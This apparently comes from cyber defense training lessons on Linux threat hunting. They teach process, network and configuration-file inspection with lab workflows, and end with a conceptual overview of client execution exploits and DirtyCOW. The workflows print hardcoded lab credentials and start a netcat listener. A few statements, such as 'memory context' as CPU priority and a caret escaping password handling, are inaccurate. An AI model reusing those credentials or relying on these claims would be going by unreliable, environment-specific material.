The directory /boot contains the files of the kernel and boot image, in addition to Grub or other bootloaders. This directory contains everything required for the boot process. This directory often resides in a partition at the beginning of the disc. Bootloaders allow a user to select different kernel images to execute if there is more than one on the Linux system. If there is only one image, the bootloader loads and executes that image by default.

-------------------------------------------
Manual Observation of Linux Host Processes
Linux Processes
﻿

Linux is a multitasking, multi-user system that allows multiple processes to run simultaneously without interfering with each other. Multiple processes running at the same time is a fundamental characteristic of Linux. A process is a task that the Linux OS is currently running. For example, Linux creates a process when a user opens a browser and ends the process when the user closes the browser.

﻿

When a process is created, it is assigned different properties, such as memory context and the Process Identifier (PID). Memory context is a priority that dictates how much time the Central Processing Unit (CPU) allocates to the process. PID is an identification number that Linux automatically assigns to each process. When a Linux computer is powered on, the process that initiates all other processes is assigned PID 1 since it is the first process to start. PID 1 is the first parent process while any other process is a child of either PID 1 or another process deeper in the process tree. 

﻿

NOTE: Some Unix-like variations use PID 0 as the first process.

﻿

The directory /proc displays additional numbered directories. Each process within the Linux system has a directory within /proc represented by the process PID number. Other named folders within /proc contain system statistics such as memory (meminfo) or CPU information (cpuinfo). Some of the directories, files, and file containers within /proc are illustrated in Figure 5.1-2, below:


![image](https://github.com/user-attachments/assets/1148026f-91de-4f92-9955-c0661eab7684)


Within the numbered PID folders are other files that contain information related to the process such as the process name and status. Some of the key files within the numbered directories include the following:
cmdline: Command line of the process
cwd: Link to the current working directory of the process
environ: Environmental variables of the process
exe: Link to the executable of the process
fd: File descriptors for a process and the files or devices the process uses
limits: Information about the limits of the process
maps, statm, and mem: Information about the memory a process uses
mounts: Information about mount points
root: Link to the root directory of the process
status: Information about the status of the process

Linux Commands for Analysis


There are multiple different tools that provide insight into the Linux processes. These tools can be used to gather information about the active processes, provide a real-time view of the kernel-managed tasks, or list out the files and processes that open them. This section reviews the following command tools:
Process status (ps)
Table of processes (top)
List of open files (lsof)

Process Status (ps)


The Process Status command ps is one of the utilities that Linux provides to view information related to the processes on a system. The command ps lists all currently running processes and their associated PIDs along with other useful information, depending on the options specified. On Linux systems, ps reads the process information from the directory /proc.


Multiple different options are available to use with ps to change the output of the command. Using the command ps by itself provides the following outputs for the current shell and current user:
PID: Unique process ID
TTY: Terminal type the user is logged into
TIME: Amount of CPU in minutes and seconds that the process has been running
CMD: Name of the command that launched the process

The man page for this command provides additional options such as the following: 
ps -e: View all running processes on a system from all users.
ps -ejH: View all processes only in hierarchical order.
ps -U root: View all processes running as root.
ps -U (User) or ps -User (User): View processes for a specific user.
ps -auxwf: View all process information in a process tree format.
ps -aux | grep 'telnet': Search for the PID of the process 'telnet'.

Table of Processes (top)


The command top is another utility for interacting with Linux processes. The command top provides a dynamic real-time view of running processes on a Linux system. The command displays a summary of the system with a list of processes or threads that are currently being managed by the Linux kernel. The command also provides a system information summary that includes resource utilization, CPU and memory usage, and the uptime for a process. The command top is similar to Task Manager in Windows.  
    
Similar to the command ps, the command top has multiple different options that can be specified to manipulate the output of the command. Directional keys (up, down, left, right) must be used to scroll through the output, while entering the letter q exits the output. Running the command top without specifying any options displays the following outputs:
PID: Tasks process ID
USER: User name of the task owner
PR: Priority of the task
NI: Nice Value of a task. 
A negative nice value indicates higher priority while a positive Nice value means lower priority.

VIRT: Total virtual memory used by the task
RES: Anything occupying physical memory
SHR: Amount of shared memory used by the task
S:[code]: Process Status of the task that uses one of the following codes:
D: uninterruptible sleep
I: idle
R: running
S: sleeping
T: stopped by job control signal
t: stopped by debugger during trace
Z: zombie

%CPU: CPU usage
%MEM: Memory usage of task 
TIME+: CPU time
COMMAND: Command or command line used to start a task or the name of the associated program.

After entering the top dashboard, there are multiple keys that can be pressed in order to manage the processes or view specific processes. Entering the letter k and the process PID sends a signal to a process. In order to kill a process, enter only the process PID without specifying a signal. For example, in Figure 5.1-3, below, the PID of 1216 was entered to kill the process vmtoolsd.


![image](https://github.com/user-attachments/assets/e1972cfe-11f2-4cc8-8ada-994d5b83cfd8)

Processes can be filtered by specific users, as well. After entering the dashboard, enter the letter u, then specify a user name to see all the processes used by a specific user. The following syntax can also be used: top -u [user name]. By default, top sorts the process list using the column %CPU. Entering any of the following letters sorts the processes by the columns listed: 
M: %MEM
N: PID
T: TIME+
P: %CPU

List of Open Files (lsof)


The command lsof is unlike the other commands in this section because it searches kernel memory to provide a list of all of the open files on a Linux system and the process they belong to. Analysts can use the information this command provides to determine the files a process or user opens. The command lsof lists all opened files by user, processes, and process IDs. 


This command can be very useful during a hunt, while investigating suspicious activity with a process. Analysts can use this command to determine the files that may have been infected or the users that may have been compromised. When running lsof, the following columns are displayed:

Command: Name of the command associated with the process that opened the file
PID: Process ID that opened the file
TID: Task ID
This column is empty when listing a process, rather than a task.

User: User ID or name of the user to whom the process belongs
FD: File descriptor of the file
Type: Type of node associated with the file
Device: Either device numbers or a kernel reference address that identifies the file
Size/Off: Size of the file or the file offset in bytes
Node: Node number of the local file 
Name: Name of the mount point and file system on which the file resides



The command lsof has multiple other options that provide different outputs based on the option specified. These options can be used to search for files based on usernames or by specific processes. If an analyst is able to identify a suspicious process, they can use the command lsof to hunt for that process and any information associated with it, such as usernames or filenames. Some of the common options for the command lsof are: 
lsof ^user1: Negates the user PID or UID specified by the caret (^).
Linux searches for all open files except those specified by the caret.

lsof -u user1: Lists all files opened by the specified user.
lsof -c process: Lists all files opened by the specified process.
lsof -p process ID: Lists all files opened by the specified PID.
lsof +D /dir: Lists all files opened by the specified directory.
lsof -i tcp: Lists all files opened by the specified network connection, protocol or port.

Analysts can also combine the commands lsof and grep to filter lsof output and perform advanced searches on a Linux system. This is useful when searching open files for a keyword or port or when searching for files that are locked by a process. Some examples of using lsof with grep include the following:
lsof -i | grep "3000"
This command displays all files involved with "3000". This could be a port required for launching another process that may be busy with a different process. This command returns the PID of the busy process, which can then be used to kill the busy process to free up the port.

sudo lsof / | grep deleted
This command searches the Linux system for files that are deleted, but still being locked by a process.

----------------------------------------------------------

Observe Linux Host Processes
Observe Linux Host Processes
﻿

Use the commands described in the previous task to view their output and possible use cases. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Open a terminal session.

﻿

3. View all running processes on the system in hierarchical order, one page at a time, by entering the following command:

(trainee@dmss-kali)-[~] $ ps -ejH | less
﻿

NOTE: In Linux, the command less is used to display the content of a file or the output of a command, one page at a time. To navigate the pages, use the up and down arrow keys. Enter q to exit after using this command to continue working in the terminal. 

﻿

4. Search for any instance of telnet in the process name by entering the following command:

(trainee@dmss-kali)-[~] $ ps -aux | grep 'telnet'
﻿

Analysts can use the command from step 5 to find the PID for a specific process name. In this case, they would replace telnet with the suspicious process name.

﻿

5. Output a dynamic, real-time view of all the running processes on a system by entering the following command:

(trainee@dmss-kali)-[~] $ top
﻿

The processes in the top dashboard can be sorted by different values. 

﻿

6. Enter the keys shift and N together to sort by PID. 

﻿

7. Enter q to exit the top utility.

﻿

8. Display all processes opened by a specific user and the command and filename they belong to by running the following command:

(trainee@dmss-kali)-[~] $ lsof -u trainee | less
﻿

9. Search for processes that are still locked on a system (even after being deleted) by entering the following command:

(trainee@dmss-kali)-[~] $ lsof | grep deleted
﻿

10. Display all files within the directory /proc by entering the following command: 

(trainee@dmss-kali)-[~] ls -al /proc | less
﻿

11. Display all files within the directory /proc for PID 1 by entering the following command:

(trainee@dmss-kali)-[~] ls -al /proc/1 | less
﻿

12. Display the status of a process within the directory /proc for PID 1 by entering the following command:

 (trainee@dmss-kali)-[~] cat /proc/1/status | less
﻿

This file provides the process name systemd and the process state S (sleeping). An analyst can use this file, when investigating a suspicious process, to find the process name, PID, and the state the process is in.

﻿

13. Display the command line of the process PID 1 by entering the following command:

(trainee@dmss-kali)-[~] cat /proc/1/cmdline
﻿

14. Display the executable path of the process PID 1 by entering the following command:

(trainee@dmss-kali)-[~] sudo ls -al /proc/1/exe
[sudo] password for trainee: CyberTraining1!
﻿

This file can be used when troubleshooting a process or investigating a process that is under suspicion.

﻿

15. Display a list of all of the files or devices that the process PID 1 is using by entering the following command:

(trainee@dmss-kali)-[~] sudo ls -al /proc/1/fd
---------------------------------------------------------------

Observe Linux Host Processes with Scripts
The commands in the previous section are useful for analyzing a process. However, when an analyst is investigating a Linux machine, there may be times when specific commands cannot be used or the commands that are being used do not provide a full picture of the process. In these cases, scripts can be created to further analyze a process and take an in-depth look at how the process is interacting with the Linux system.

﻿

Execute a Script to Further Analyze a Process
﻿

Find a process and execute a script to view detailed information about that process. 

﻿

Workflow
﻿

1. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Open a browser.

﻿

3. Open a terminal console.

﻿

4. In the terminal, enter the following commands:

(trainee@dmss-kali)-[~] $ top
﻿

5. Once the top utility has opened, enter the keys shift and M together to sort the data by the %MEM column. 

﻿

6. Identify the PID for the very top entry, which is the web browser (firefox-esr) that was opened in step 2.

﻿

7. Run the process metrics collection script by entering the following command, where PID is the PID from step 6:

(trainee@dmss-kali)-[~] $ ./process-metrics-collector.sh PID
﻿

This runs the script and collects data about the running process such as CPU usage, memory, Transmission Control Protocol (TCP) connections, and thread count. This script is useful when suspicious processes are identified because it displays additional information about the process in the format .csv.

﻿

8. Allow the script to run for 2-3 minutes.

﻿

9. Enter ctrl and c to stop the script. 

﻿

Since the script is constantly collecting data, it runs until it is stopped.

﻿

10. In the top left of the VM, select the folder drop-down.

﻿

11. Open the data folder.

﻿

12. Open the folder within the data folder.

﻿

13. Open the file metrics.csv.

﻿

14. Select Ok in the Text Import pop-up window. 

﻿

The file metrics.csv displays a table of all the information that was collected. This script can be used to analyze the CPU and memory usage as well as any TCP connections for a specific process. An analyst can run this script if they suspect that a process is using large amounts of memory or CPU at specific times throughout the day. The analyst can then use the data from this script to identify the specific time that a process has high usage and any TCP connections during this time. This information provides analysts the specific timeframe that an attack may have occurred, which is critical information for a hunt.

﻿

15. Display the script and analyze its contents by entering the following command:

(trainee@dmss-kali)-[~] cat process-metrics-collector.sh
﻿

The bottom if section of the script includes the command top. Here, this command serves to get the CPU and memory usage of the specified PID. The command lsof is included to get the TCP connections. Lastly, the command ps is included to get the thread count usage for the specified process. 

﻿

Scripts can be created in order to combine multiple different commands into one single output. Sometimes viewing all the data together provides a different viewpoint of a process and additional clues as to how the process is running or if it is malicious.

﻿------------------------------------------------------------

 
Manual Observation of Linux Host Communications
Linux Host Communications
﻿

When hunting for threats on an environment, analysts often come across Linux systems that are part of the network. These systems often communicate with other Linux and Windows hosts within the network, so it is important to understand how to examine these communications on Linux systems. 

﻿

Each Linux distribution has slightly different defaults for the network interfaces, but the traditional network interfaces are named as follows:

eth0: The first ethernet interface for the Linux host. This interface is usually a network interface card connected to the network via ethernet cable. Any additional interfaces would be named eth1, eth2, and so on.

lo: The loopback interface. This is the interface that the system will use to communicate with itself.

wlan0: The name of the first wireless interface on the Linux host. Additional wireless interfaces would be named wlan1, wlan2, and so on. 

Multiple different Linux commands are available to help gain insight into the communications between hosts. This section covers some of the most useful Linux commands, which include:

Interface configuration (ifconfig)

Internet protocol (ip)

Name server lookup (nslookup)

Domain information group (dig)

Trace Route (traceroute)

Network Statistics (netstat)

Interface Configuration (ifconfig)
﻿

The command ifconfig configures the network interfaces on a Linux host. This command is used to configure the necessary interfaces when a Linux host is initially set up. After initial setup, the command ifconfig is usually only used when troubleshooting or re-configuring the Internet Protocol (IP) addresses for the host. This command can be used to assign an IP address and netmask to an interface or to enable and disable an interface on a Linux host. Newer Linux distributions do not have ifconfig pre-installed and, instead, use the command ip.

﻿

Multiple options are available to use ifconfig to display different information about the interfaces on the Linux host. These options include the following, which are listed with example interfaces and IP addresses:

ifconfig: Displays information about the network interfaces currently in use.

ifconfig -a: Displays all available interfaces in detail, even if they are down.

ifconfig -s: Displays a summary of the interfaces without additional detail.

ifconfig eth0: Displays information for only the listed interface, such as eth0.

ifconfig eth0 up: Activates a given interface.

ifconfig eth0 down: Deactivates a given interface.

ifconfig eth1 172.16.35.1 netmask 255.255.255.0: Assigns a given IP address and netmask to a given interface. 

Internet Protocol (ip)
﻿

The command ip is similar to the command ifconfig in some of the basic functions they both perform. However, the command ip is significantly more powerful. This command provides the routing, devices, and tunnels for a system while also configuring network interfaces or configuring the default and static routing for a Linux host. This command is also used to set up tunnel over IP, list IP addresses, or modify the status of an interface. On most Linux distributions the command ip replaces the command ifconfig.

﻿

The command ip offers multiple options that each provide different information about the communications for a Linux host. The command can be used in many different ways, but the most common use of the ip command is to list the IP addresses on a system, as displayed in Figure 5.1-4, below. The main information from this figure can be broken down as follows:

eth0: The network interface.

state UP: The current state of the interface eth0. 

group default: Interfaces can be grouped logically, but their default treatment is to place them in a group named default.

link/ether: The Media Access Control (MAC) address of the interface.

inet: The IP address with the netmask in the Classless Inter-Domain Routing (CIDR) notation. 

brd: The broadcast address for this subnet. 


![image](https://github.com/user-attachments/assets/10cd8e25-9447-4f2d-8673-fd0a8f49250e)

The commands ip address show, ip addr show, ip addr, and ip a all provide the same output as in Figure 5.1-4, above. 


Similar to ifconfig, the ip command also offers multiple different options for displaying additional useful information or reconfiguring the Linux systems networking. The options include the following, listed using example interfaces and IP addresses:
ip addr show eth1: Displays the statistics for a single specified interface. 
ip -s link: Displays the link layer statistics of all of the active network interfaces.
ip route: Displays the routes that packets take within the network for the Linux host. The first entry is the default route set.
ip route add 192.168.1.0/24 via 10.0.0.1 dev eth1: Adds a static route to the 192 network through a router with an IP address of 10.0.0.1.
ip route del 192.168.1.0/24: Removes the route to the 192 network from the routing table. 
ip addr add 192.168.4.44 dev eth1: Adds a specified IP address to the specified interface.
ip addr del 192.168.4.44 dev eth1: Removes an IP address from the specified interface.
ip link set eth1 down; ip link set eth1 up: Stops or starts an interface.
ip link | grep PROMISC: Searches for promiscuous mode, which could indicate a packet sniffer being used by an adversary.

Name Server Lookup (nslookup)


The name server lookup command, nslookup, provides information from the Domain Name System (DNS) server in a network. This tool is used primarily by network administrators to query the DNS to obtain a domain name or IP address mapping or any other DNS-specific records. The command nslookup is also used to troubleshoot DNS-related issues. 


The command nslookup is simple, but useful. If an analyst comes across a domain name or the IP address of a domain that appears to be suspicious, nslookup can be used to verify that information. The following are the most commonly used nslookup commands using google.com as an example domain name:
nslookup google.com: Displays the A Record (IP address) of the domain. 
nslookup 192.168.4.44: Provides the DNS name for the specified IP, if there is one, as a reverse DNS lookup.
nslookup -type=any google.com: Performs a lookup for any Name Server (NS) record for the domain specified but also includes non-NS records. 

Domain Information Groper (dig)


The domain information groper command, dig, retrieves information about DNS name servers. It is used to verify and troubleshoot DNS problems and to perform DNS lookups. The command dig performs similar functions to the command nslookup. The command dig can be used to perform a DNS lookup through domain name or IP address. It can also be used to search for any DNS records. The syntax for this command is as follows, using google.com as the example domain:

dig google.com: Queries the domain A record for the listed domain.
dig google.com +short: Returns only the IP address for the listed domain, rather than the entire A record. 
dig google.com ANY: Displays all DNS record types for the listed domain  but also includes non-DNS records.
dig -x 172.17.14.210: Looks up a domain name by the specified IP address. 

Trace Route (traceroute)


In Linux, the command traceroute prints the route that a packet takes to reach the intended host. This command is useful when gathering information about a route and all of the hops that a packet takes. The command traceroute tries to get a response from each of the routers at each hop, from the source that runs the command to the destination specified. Network administrators often use this command to find slow routers or to identify where packets are being dropped when a destination is unreachable. The syntax for this command is traceroute google.com, where google.com is replaced with the intended destination.


Network Statistics (netstat)


The network statistics command, netstat, is used to display information about various interface statistics, such as the ports that are in use and the processes using them, routing tables, and connection information. This command also displays the sockets that are pending a connection. The command netstat can be useful for analysts who are hunting on a system and suspect that there may be suspicious processes running. Analysts can also use this command to view these processes and the ports that they are using. 


The command netstat has various options that analysts can use to display additional information. Running the command netstat by itself displays a list of all active sockets on the system. Other options to use with the netstat include the following:
netstat -nap: Searches for suspicious port listeners on a system.
netstat -pnltu: Displays all active listening ports on a system. 
netstat -a | less: Displays all connected and waiting sockets, one page at a time.
netstat -l | less: Displays all sockets that are in a listening state, one page at a time.
netstat -p -at: Lists the PID of any TCP processes using both a socket and the process name. 
netstat -r: Displays the routing table.
netstat -nap | grep "sshd": Searches  for a proc ess by name and identifies th e port it  is using. Alternatively, "sshd" can be replaced by a port  number to  search  for a proc ess that is using a specific port.

NOTE: Many modern Linux distributions (notably, Debian and Ubuntu) do not install older net tools by default. ss is the modern equivalent of netstat.

--------------------------------------------------------------------------

Observe Linux Host Communications
Manual Observation of Linux Host Communications
﻿

Use the networking commands from the previous section to view detailed information about the Linux system. Then, use the commands to view and observe how a Linux host communicates.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Open a terminal console.

﻿

3. Display the interfaces with their basic information by entering the following command:

(trainee@dmss-kali)-[~] $ ifconfig
﻿

4. Enter the command ip addr to observe the same interfaces as in step 3 and compare the differences between both commands.

﻿

When using the command ip addr, the MAC address and IP address of each interface are highlighted in color to make them easier to observe. 

﻿

5. Display the default routes for a Linux system by entering the following command:

(trainee@dmss-kali)-[~] $ ip route
﻿

6. Change the interface of eth1 to down by entering the following command:

(trainee@dmss-kali)-[~] $ sudo ip link set eth1 down
[sudo] password for trainee: CyberTraining1! 
﻿

7. Enter the command ip addr to observe the eth1 interface. 

﻿

The interface eth1 displays DOWN in red.

﻿

8. Set eth1 back to up by entering the following command:

(trainee@dmss-kali)-[~] $ sudo ip link set eth1 up
[sudo] password for trainee: CyberTraining1!
﻿

9. Search for suspicious processes on the system by entering the following command:

(trainee@dmss-kali)-[~] $ netstat -nap | less
﻿

This command displays processes from a networking point of view. This command can be used to view the file and protocol that is being used and the state that the process is in.

﻿

10. Search for any instance of the process ssh by entering the following command:

(trainee@dmss-kali)-[~] $ netstat -nap | grep 'ssh'
﻿

Netstat can also be used to search for any instance of a running process by name to determine whether it is in a listening state. This is helpful in searching for any adversaries that are listening for a specific process or port to use in an attack. In the above command, ssh can be replaced with any process or port that is unknown or suspected of being used by an adversary.

------------------------------------------------------------------

Observe Linux Host Communications with Scripts
The Linux OS pulls various network parameters and statistics from the directory /proc/net. Each directory and virtual file within this directory contains different aspects of the networking of the system. For example, the file /proc/net/tcp contains all of the system's TCP connection information. 

﻿

There are times when the common commands that trainees learns from this lesson are not available on a Linux system. In this case, it is common to create a script that pulls the information from the directory /proc.

﻿

Execute a Script to Observe Linux Communications
﻿

Execute a basic script that pulls the TCP information from the file /proc/net/tcp and provides IP address information as the output.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Open a terminal console.

﻿

3. Populate data into the file /proc/net/tcp and leave the Netcat listener running by entering the following command:

(trainee@dmss-kali)-[~] $ nc -l -p 1337
﻿

4. Open a second terminal.

﻿

5. Display any data within the file /proc/net/tcp by entering the following command:

(trainee@dmss-kali)-[~] $ cat /proc/net/tcp 
﻿

The data within this file is in hexadecimal format. It is not very easy to read. It would be more difficult if there were multiple entries.

﻿

6. Run the networking script with the following command:

(trainee@dmss-kali)-[~] $ ./net.sh
﻿

This script pulls the information from the file /proc/net/tcp and puts it into a more readable format. It provides the local IP address and port of any connections along with the remote address and port. In this example, the connection is the Netcat listener on port 1337. Scripts such as this are useful in an environment that is locked down and does not have internet access.

﻿

7. Display the script by entering the following command:

(trainee@dmss-kali)-[~] $ cat net.sh
﻿

This script uses the command awk to process the hexadecimal text into a more readable format. It then prints the information from the TCP file into "Local - Remote" output. At the very end is the path that the script is specified to search. The path /proc/net/tcp can be changed to /proc/net/udp, as well, to parse through User Datagram Protocol (UDP) files. This output is similar to using the netstat command. While the script does not display whether a port is listening, anything connected to a remote address of 0.0.0.0:0 is a listening port.

---------------------------------------------------------


Linux Configuration Files
Linux has various configuration files that control system functions such as user permissions, system applications, daemons, services, and other system tasks. Each file serves a specific purpose and most files are structured in different formats. The majority of configuration files on a Linux system are in the directory /etc. Analysts must learn how to identify and modify common Linux configuration files since these files often affect the security of the OS. This section covers the eight configuration files from the directory /etc that are listed in Figure 

![image](https://github.com/user-attachments/assets/b39f79f6-1d86-4cc6-9988-7159f908daa1)


/etc/sudoers


The file /etc/sudoers is used to determine whether a user has root permissions to run commands or executables that require elevated privileges. If a user attempts to run a command that requires elevated privileges, Linux checks that username against the file sudoers. This happens when the command sudo is used. If Linux does not find the username within the file, the program or command requiring elevated privileges will not run. Root permissions and the tool visudo are required to modify the file /etc/sudoers.


/etc/hosts, /etc/hosts.allow, and /etc/hosts.deny


The file /etc/hosts is a simple text file that contains a list of host-to-IP address mappings. This file can be used if the IP of the system is not dynamically generated. The file /etc/hosts is used prior to querying an external DNS server for a hostname-to-IP address mapping. If the Linux system does not find a match in the file /etc/hosts, it checks DNS next. Adversaries often modify the file /etc/hosts when attempting to block security products from successfully connecting to external services. This is done by inserting a bogus entry into the file /etc/hosts that does not actually point to the intended target, such as the localhost (127.0.0.1).


Each line in the file /etc/hosts consists of an IP address followed by the hostname and then any aliases. The format to add additional entries to the file is IP_ADDRESS HOSTNAME.


Linux also implements access control lists through the file /etc/hosts to provide added security for network services using the Transmission Control Protocol Wrapper Daemon (TCPD). The file /etc/hosts.allow contains a list of allowed and non-allowed hosts and networks. Connections to network services can be both allowed or denied by defining the access rules in this file. The file /etc/hosts.deny contains a list of hosts or networks that are not allowed to access the Linux system. The access rules in this file can be set up in the file /etc/hosts.allow by using the deny option.


The access rules in the file /etc/hosts.allow are applied first. These rules take precedence over rules in the file /etc/hosts.deny. If access to a service is allowed in /etc/hosts.allow, any rule denying access to that same service in /etc/hosts.deny is ignored. If there are no rules for a Linux service in either file then access to the service will be granted to all remote hosts.


The syntax to define an access rule in these files is as follows:
daemon_list : client_list : option 



The components of this syntax include the following:
daemon_list: A comma-separated list of network services such as Secure Shell (SSH) or File Transfer Protocol (FTP), or the keyword ALL for all daemons.
client_list: A comma-separated list of valid hostnames or IP addresses, or the keyword ALL for all clients.
options: An optional command that is executed when a client tries to access a server daemon.

/etc/fstab and /etc/mtab


The file /etc/fstab is one of the most important configuration files on a Linux system because it specifies the devices and partitions available, as well as where and how to use them. This file is created during the setup of the initial system and it can be modified to fit the use of the system. 


The file /etc/fstab identifies the devices to mount each time the Linux system boots. When the system boots, Linux automatically mounts the volumes that are specified in this file. The file has six different fields that control how a device is mounted. Figure 5.1-6, below, displays an example of an /etc/fstab entry: 

 ![image](https://github.com/user-attachments/assets/647046eb-f68c-4ee8-9fb9-7fb73bfe6f9f)

An /etc/fstab entry uses the following format and sequence:
device: Usually the given name or Universally Unique Identifier (UUID) of the mounted device. In the above example it is sr0.
mounting_directory: Designates the directory where the device is mounted. This is the directory where the data can be accessed. In the example, it is /media/cdrom0.
filesystem_type: Specifies the filesystem type.
options: Describes the mount options.
dump: Specifies the option that needs to be used by the backup utility program. If the value is zero, the entry is excluded from taking backup. If it is nonzero, the filesystem is backed up.
fsck: If this value is set to zero, the device is excluded from the fsck check. If the value is nonzero, the device runs in the order in which the value is set. 

The file /etc/mtab tracks the currently mounted volumes on the system. When filesystems are mounted and unmounted, the change is immediately reflected in this file. The command mount /etc/mtab displays the contents of the file /etc/mtab to determine the volumes that are currently mounted on a system. 


/systemd and /system


Most modern Linux distributions use systemd as a system and service manager. Systemd initializes the Linux system after the boot process has finished and it has the first process PID 1. All the systemd tasks are known as units. Each unit is configured by a unit file. Systemd categorizes units according to the type of resource they describe. For a service, this unit file specifies the location of the binary and the start parameters. The most common systemd units include the following:
.service: Describes how to manage a service or application, including how to start or stop the service or when the service should be started.
.mount: Defines a mountpoint on the system.
.device: Describes a device that systemd manages.
.socket: Describes a network or Interprocess Communication (IPC) socket, or a buffer that systemd uses for socket-based activation.
.timer: Defines a timer that is managed by systemd for scheduled activation. 
.target: Defines a target unit that is used to provide synchronization points for other units when booting up or changing states.

There are two default locations for the systemd unit files. The first location, /usr/lib/systemd/user, is the default location for unit files that are installed by packages. The next location /etc/systemd/system is the directory for unit files. This directory takes precedence above all others for systemd unit files. The files in this directory are typically services and processes that can be manually configured.


The command systemctl is used to control the services that are managed by systemd. The most common commands for systemctl include the following:
systemctl start [name.service]
systemctl stop [name.service]
systemctl restart [name.service]
systemctl reload [name.service]
systemctl status [name.service]
systemctl is-active [name.service]
systemctl list-units --type service --all

------------------------------------------------------------------------------

Modify Linux Configuration Files
Linux offers different types of parameters that can be set to restrict and control network access to a system to provide added security. The files /etc/hosts.allow and /etc/hosts.deny can be configured to allow certain networks and services to be used or disallowed on the Linux system. Rules within these files can be set based on hostname, IP address, user name, or process name. 

﻿

Modify Linux Configuration Files
﻿

Add rules to the files /etc/hosts.allow and /etc/hosts.deny to harden the Linux system.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 

﻿

2. Open a terminal console.

﻿

3. To edit the file /etc/hosts.allow, enter the following:

(trainee@dmss-kali)-[~] $ sudo vim /etc/hosts.allow
[sudo] password for trainee: CyberTraining1!

﻿

4. Enter the following on the very first available line:

ALL: 192.168.
﻿

Step 4 allows all hosts within the subnet 192.168.0.0/16 to use all ports and services on the Linux system.

﻿

5. Enter a line break to start a new line, then enter the following to specify items that are allowed:

ALL: dns.google.com, mail.google.com, 212.23.4.12, 172.16.
﻿

This entry specifies that the two hostnames, dns.google.com and mail.google.com, the IP address 212.23.4.12, and the network 172.16.0.0/16 are all allowed.

﻿

6. Enter a line break, then enter the following to allow SSH access for any user with the domain name .abc.com:

sshd: .abc.com
﻿

7. Select esc, and enter :wq! to exit and save the file.

﻿

8. Open the file /etc/hosts.deny with the following command:

(trainee@dmss-kali)-[~] $ sudo vim /etc/hosts.deny
[sudo] password for trainee: CyberTraining1!
﻿

Any entries in the file hosts.allow take precedence over the entries in the file hosts.deny. It is best practice to follow up any allow rules with a deny-all rule in hosts.deny.﻿

﻿

9. In the file /etc/hosts.deny, on the first available line, add the following entry to deny all services to all hosts that were not specified in the allow file.

ALL: ALL
﻿

10. On the next available line, add the following entry to deny access to the service sshd for everyone that was not specified in the file hosts.allow. 

sshd: ALL
﻿

11. On the next available line enter the following to deny access to all services to any host that is part of the 10.0.0.0 network:

ALL: 10.
 ﻿

12. Select esc, and enter :wq! to exit and save the file. 


-----------------------------------------------

########## M5 L2 ############
############# Common Linux Exploits ############

Overview of Exploits and Rootkits
There are many exploitation techniques that adversaries implement on a variety of systems, including both Windows and Linux. Although these exploits are not unique to Linux, they do have unique properties when considering a Linux environment. The next five sections of this lesson describe how to detect and address the following exploits on Linux systems:

Client execution
Ptrace system calls
Proc memory
Rootkit
Kernel modules and extensions
﻿
---------------------------------------------------------

Identifying Exploitation for CE
In the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Client Execution [T1203] occurs when an adversary "... exploits software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to insecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system." 

﻿

This section introduces CE exploits that involve the following features:

Remote Code Execution (RCE)

Local systems or applications

Privilege escalation kernels

RCE Exploits
﻿

As discussed in previous lessons, RCE exploitation occurs when an adversary takes advantage of a system or software vulnerability on a target host and runs arbitrary code from another system. Adversaries perform RCE attacks with code injections to obtain a foothold on the network. MITRE provides two Common Weakness Enumerators (CWE) related to RCE exploits: CWE-94 Code Injection and CWE-95 Eval Injection. 

﻿

CWE-94 Code Injection
﻿

MITRE defines code injection as follows: 

“The software constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment." 

﻿

This means that a code injection attack is possible when a segment of code in an application is not properly sanitizing input. Form fields that accept user entries are commonly vulnerable to code injections. For example, an adversary may enter a caret (^) character in the password field of a login page to escape the password management process. After the caret, the threat actor may execute additional characters as code to perform the code injection attack.

﻿

CWE-95 Eval Injection
﻿

MITRE defines eval injection as follows:

"The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call.” 

﻿

A dynamic evaluation call occurs when user input is accepted in unsanitized fields and passed to an eval() statement to be processed as code. In practice, an eval injection attack is similar to a domino effect. Adversaries do not need to run malicious passwords as code to execute an eval injection in a password field. Instead, the malicious password is passed to the internal hashing tool, which is then manipulated by the adversary's code to perform a code injection later in the process chain.

﻿

Local System or Application Exploits
﻿

After an adversary gains local access to a Linux system, they may need to perform additional local exploits to fully realize their goal in the attack chain. Many of these exploits work only with OS or application-specific vulnerabilities. Red Hat Security explains that application vulnerabilities occur when attackers “find faults in desktop and workstation applications (such as email clients) and execute arbitrary code, implant Trojan horses for future compromise, or crash systems. Further exploitation can occur if the compromised workstation has administrative privileges on the rest of the network." 

﻿

There are many compliance regulations specific to different Linux distributions due to the greater granularity of Linux package and application management when compared to a Windows environment. Compliance regulations, such as the Defense Information Systems Agency (DISA) Security Technical Implementation Guides (STIG), provide valuable guidelines for Linux-specific system and application management on a distribution-specific basis. The DISA STIGs are a common compliance standard for many organizations that are updated often. The frequent updates are important because stale and forgotten Linux applications can quickly lead to exploitation.

﻿

Privilege Escalation Kernel Exploits
﻿

The Linux kernel is the code that works directly with the system hardware as the basis for the Linux OS. Properly exploiting a vulnerability in the kernel is a quick way to get root access. Exploits such as “Dirty Copy-On-Write” (DirtyCOW) allow adversaries to take advantage of the way that Linux handles objects in Random Access Memory (RAM). Adversaries use these types of exploits to write to memory addresses that should have been read-only, resulting in root level access.

﻿

